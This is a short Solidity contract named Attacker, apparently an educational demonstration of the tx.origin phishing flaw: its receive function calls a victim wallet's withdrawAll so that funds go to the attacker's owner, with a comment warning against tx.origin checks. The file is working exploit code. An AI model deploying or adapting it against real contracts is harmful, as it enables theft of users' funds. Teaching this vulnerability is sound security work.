// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ISmallWallet {
    function withdrawAll(address _recepient) external;
}

contract Attacker is Ownable{
    ISmallWallet private immutable smallWallet;

    constructor(ISmallWallet _smallwallet){
        smallWallet = _smallwallet;
    }

    //If small wallet sends Ether tx.orign will be this contracts address & withdrawAll will pass check
    // never use tx.orign as owner verifier
    receive() external payable{
        smallWallet.withdrawAll(owner());
    }
}